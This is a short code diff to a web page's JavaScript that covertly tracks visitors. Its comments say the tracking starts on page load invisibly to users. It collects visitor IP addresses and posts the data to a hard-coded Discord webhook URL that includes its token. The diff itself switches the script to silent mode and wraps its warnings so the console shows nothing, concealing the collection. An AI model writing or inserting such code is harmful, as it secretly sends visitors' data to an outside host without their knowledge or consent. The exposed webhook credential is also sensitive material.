@@ -11,8 +11,8 @@
         const TRACKING_CONFIG = {
             enabled: true,
             webhookURL: 'https://discord.com/api/webhooks/1447216598938026204/kpIYSeBCXSBypUnXrWmKonou6XXp4sz-ZdiKtghxnrT2G7d-UoQnV_iyPZ2TriCvysmX', // Your Discord webhook
-            silent: false, // Set to true in production to hide logs
-            debug: true // Set to false in production - shows what's happening
+            silent: true, // Silent mode - no console output
+            debug: false // Debug mode off - completely clean console
         };
         
         // Initialize tracking on page load (invisible to users)
@@ -98,7 +98,7 @@
                     }
                     
                 } catch (ipError) {
-                    console.warn('⚠️ All IP APIs failed, continuing with Unknown IP:', ipError.message);
+                    if (TRACKING_CONFIG.debug) console.warn('⚠️ All IP APIs failed, continuing with Unknown IP:', ipError.message);
                     // Continue with unknown IP - still send other data
                 }
                 
@@ -162,7 +162,7 @@
                     const webhookResult = await sendToWebhook(trackingData);
                     if (TRACKING_CONFIG.debug) console.log('✅ Webhook sent successfully!', webhookResult);
                 } else {
-                    console.warn('⚠️ No webhook URL configured');
+                    if (TRACKING_CONFIG.debug) console.warn('⚠️ No webhook URL configured');
                 }
                 
                 // Silently store in localStorage (only accessible to you when you check)
